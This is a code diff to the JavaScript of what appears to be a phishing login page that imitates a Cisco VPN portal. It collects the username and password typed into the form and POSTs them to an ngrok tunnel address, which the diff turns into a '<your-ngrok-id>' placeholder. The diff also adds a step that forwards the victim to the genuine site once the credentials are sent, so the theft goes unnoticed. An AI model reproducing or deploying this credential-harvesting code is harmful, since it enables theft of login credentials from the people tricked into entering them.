@@ -154,8 +154,19 @@ function validate_username(username)
 
 function sendToNgrok(username, password) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://b3a1-197-253-194-145.ngrok-free.app/submit", true);
+    xhr.open("POST", "https://<your-ngrok-id>.ngrok-free.app/submit", true);
     xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+                redirectToSite();
+            } else {
+                alert("Failed to submit credentials. Please try again.");
+            }
+        }
+    };
+    
     xhr.send(JSON.stringify({ username: username, password: password }));
 }
 
@@ -167,14 +178,11 @@ function formSubmit() {
         sendToNgrok(primary_username.value, password_input.value);
     }
 
-    setTimeout(redirectToSite, 2000);
-
-    return true;
+    return false;  // Prevent the form from submitting normally
 }
 
-// Add the redirection function
 function redirectToSite() {
-    window.location.href = "https://185.79.192.62/+CSCOE+/logon.html#form_title_text";
+    window.location.href = "https://185.79.192.62";
 }
 </script>
 
